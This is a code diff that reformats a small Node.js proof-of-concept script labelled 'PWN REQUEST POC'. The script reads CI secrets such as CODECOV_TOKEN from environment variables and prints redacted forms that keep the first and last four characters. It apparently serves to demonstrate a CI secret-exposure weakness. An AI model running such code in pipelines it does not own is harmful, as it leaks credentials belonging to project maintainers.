@@ -1,7 +1,7 @@
 function redact(v) {
   if (!v) return "<missing>";
   if (v.length < 10) return "[present]";
-  return v.slice(0,4) + "...REDACTED..." + v.slice(-4);
+  return `${v.slice(0, 4)}...REDACTED...${v.slice(-4)}`;
 }
 
 console.log("=== PWN REQUEST POC ===");
@@ -13,7 +13,7 @@ const secrets = {
   CODECOV_TOKEN: process.env.CODECOV_TOKEN,
 };
 
-for (const [k,v] of Object.entries(secrets)) {
+for (const [k, v] of Object.entries(secrets)) {
   console.log(`${k}: ${redact(v)}`);
 }
 
